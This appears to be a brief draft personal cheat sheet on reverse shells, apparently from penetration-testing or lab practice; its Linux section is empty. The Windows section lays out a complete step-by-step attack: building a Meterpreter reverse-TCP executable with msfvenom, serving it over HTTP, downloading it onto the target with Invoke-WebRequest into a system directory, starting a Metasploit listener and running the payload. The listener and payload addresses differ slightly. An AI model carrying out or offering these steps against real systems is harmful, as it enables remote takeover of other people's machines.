---
created: 2026-08-15
updated: 2026-08-15
tags:
status: draft
---
## Reverse shells

## Linux reverse shells

## Windows reverse shells

### `msfvenom`

- Generate a shell using `msfvenom`:

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.228 LPORT=4444 -f exe -o shell.exe
```

- Serve the shell from your machine:

```bash
python -m http.server 8080
```

- Download the shell to the target machine:

```bash
Invoke-WebRequest -Uri "http://10.10.14.228:8080/shell.exe" -OutFile "C:\Windows\System32\inetsrv\shell.exe"
```

- Start a listener:

```bash
msfconsole -q
use exploit/multi/handler
set LHOST 10.10.14.229
set LPORT 4444
set payload windows/meterpreter_reverse_tcp
run
```

- Execute the shell:

```bash
shell.exe
```